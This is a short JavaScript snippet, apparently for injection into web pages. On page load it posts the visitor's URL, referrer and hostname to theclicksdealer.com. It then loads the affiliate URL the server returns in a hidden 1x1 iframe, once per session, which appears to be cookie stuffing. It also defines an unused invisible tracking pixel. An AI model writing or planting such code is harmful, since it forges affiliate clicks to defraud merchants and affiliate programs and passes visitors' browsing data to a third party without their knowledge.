(function () {

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = Math.random() * 16 | 0;
      var v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function createTrackingPixel(url) {
    var img = document.createElement("img");
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = "none";
    document.body.appendChild(img);
  }

    function createClickIframe(url) {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.width = "1";
        iframe.height = "1";
        iframe.style.display = "none";
        iframe.style.visibility = "hidden";
        document.body.appendChild(iframe);
    }

  async function initTracking() {
    if (sessionStorage.getItem("tracking_done")) return;

    try {
      const uid = generateUUID();

      const res = await fetch("https://theclicksdealer.com/api/track-users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uid,
          origin: location.hostname,
          payload: {
            path: location.pathname
          }
        })
      });

      const data = await res.json();

      if (data.success && data.affiliate_url) {
        createClickIframe(data.affiliate_url);
        sessionStorage.setItem("tracking_done", "1");
      } else {
        console.log("Tracking blocked:", data.reason);
      }

    } catch (e) {
      console.error("Tracking error", e);
    }
  }


  document.addEventListener("DOMContentLoaded", function () {
    
    initTracking();
  });

})();